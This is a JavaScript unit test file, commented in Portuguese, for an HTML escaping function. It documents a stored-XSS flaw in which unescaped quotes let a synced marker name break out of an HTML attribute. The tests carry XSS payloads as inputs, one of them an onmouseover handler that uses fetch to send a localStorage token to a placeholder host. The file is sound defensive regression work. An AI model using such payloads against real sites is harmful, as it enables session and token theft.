// Path: tests/unit/html-escape.test.js
//
// O ESCAPADOR PRECISA SERVIR TAMBEM AO CONTEXTO DE ATRIBUTO.
//
// A versao anterior era `div.textContent = text; return div.innerHTML`, e o
// JSDoc dela afirmava escapar aspas. Nao escapava: a serializacao de um NO DE
// TEXTO troca so `&`, `<`, `>` e o espaco duro. Aspas so sao escapadas dentro de
// valor de atributo, e um no de texto nunca e um.
//
// O resultado e a forma mais traicoeira de defeito de seguranca: seguro no caso
// que o exemplo do JSDoc mostrava (conteudo de elemento) e inseguro no caso que
// os chamadores mais usam (28 interpolacoes dentro de atributo, em 9 arquivos).
// Como nome de feicao viaja entre usuarios pelo sync, o payload era armazenado e
// disparava na sessao de outra pessoa.
//
// Dois detalhes que o teste prende de proposito, porque erra-los e comum:
//  - o `&` tem de ser trocado PRIMEIRO, senao a saida das outras trocas e
//    escapada de novo e o texto sai corrompido;
//  - a funcao ficou PURA, sem `document`. E o que permite testa-la aqui: o
//    ambiente de teste e node, sem jsdom, e a versao antiga nao rodava.

import { test, describe } from 'vitest';
import assert from 'node:assert/strict';
import { escapeHtml } from '@utils/html-escape.js';

describe('escapeHtml', () => {
    test('escapa os tres de sempre', () => {
        assert.equal(escapeHtml('<img src=x onerror=alert(1)>'),
            '&lt;img src=x onerror=alert(1)&gt;');
        assert.equal(escapeHtml('a & b'), 'a &amp; b');
    });

    test('escapa ASPAS, que e o caso que faltava', () => {
        assert.equal(escapeHtml('a"b'), 'a&quot;b');
        assert.equal(escapeHtml("a'b"), 'a&#39;b');
    });

    test('o payload real de fuga de atributo nao fecha mais o atributo', () => {
        // O nome que um usuario poderia dar a um marcador 3D. Repare que ele
        // NAO tem `<` nem `>`: a versao antiga o deixava passar inteiro.
        const nome = 'a" onmouseover="fetch(\'//x/\'+localStorage.token)';
        const saida = escapeHtml(nome);
        const html = `<span title="${saida}">x</span>`;

        assert.ok(!saida.includes('"'), `sobrou aspa dupla crua: ${saida}`);
        assert.ok(!saida.includes("'"), `sobrou aspa simples crua: ${saida}`);
        // O atributo abre e fecha exatamente uma vez: as duas unicas aspas
        // cruas do documento sao as que o template escreveu.
        assert.equal((html.match(/"/g) || []).length, 2);

        // E o teste que discrimina: o payload inteiro tem de estar DENTRO do
        // valor do atributo. Com o escapador antigo, `onmouseover` caia fora
        // do par de aspas e virava um atributo de verdade.
        const valor = html.match(/title="([^"]*)"/);
        assert.ok(valor, 'o title deixou de ser um atributo bem formado');
        assert.ok(valor[1].includes('onmouseover'),
            'o payload vazou do valor do atributo');
        assert.equal(html.slice(html.indexOf(valor[0]) + valor[0].length), '>x</span>');
    });

    test('o & vem primeiro: nada e escapado duas vezes', () => {
        // Se `&` fosse trocado por ultimo, `<` viraria `&amp;lt;` e o usuario
        // leria o codigo da entidade na tela em vez do sinal.
        assert.equal(escapeHtml('<'), '&lt;');
        assert.equal(escapeHtml('&lt;'), '&amp;lt;');
        assert.equal(escapeHtml('&'), '&amp;');
        assert.ok(!escapeHtml('<>"').includes('&amp;lt;'));
    });

    test('vazio, nulo e indefinido viram string vazia', () => {
        assert.equal(escapeHtml(null), '');
        assert.equal(escapeHtml(undefined), '');
        assert.equal(escapeHtml(''), '');
    });

    test('numero e booleano viram texto, e nao estouram', () => {
        assert.equal(escapeHtml(42), '42');
        assert.equal(escapeHtml(0), '0');
        assert.equal(escapeHtml(false), 'false');
        assert.equal(escapeHtml(NaN), 'NaN');
    });

    test('texto sem nada a escapar volta identico', () => {
        // Controle: um escapador que mexesse em tudo tambem passaria nos casos
        // acima. Este separa "escapa o perigoso" de "mexe em tudo".
        const limpo = 'Ponto de Controle 3 — Serra do Curral (1.234 m)';
        assert.equal(escapeHtml(limpo), limpo);
    });

    test('nao depende de document, entao roda fora do navegador', () => {
        // A garantia que este arquivo inteiro representa: se a implementacao
        // voltar a usar `document`, este teste quebra no ambiente node.
        assert.equal(typeof globalThis.document, 'undefined');
        assert.equal(escapeHtml('<a href="x">'), '&lt;a href=&quot;x&quot;&gt;');
    });
});
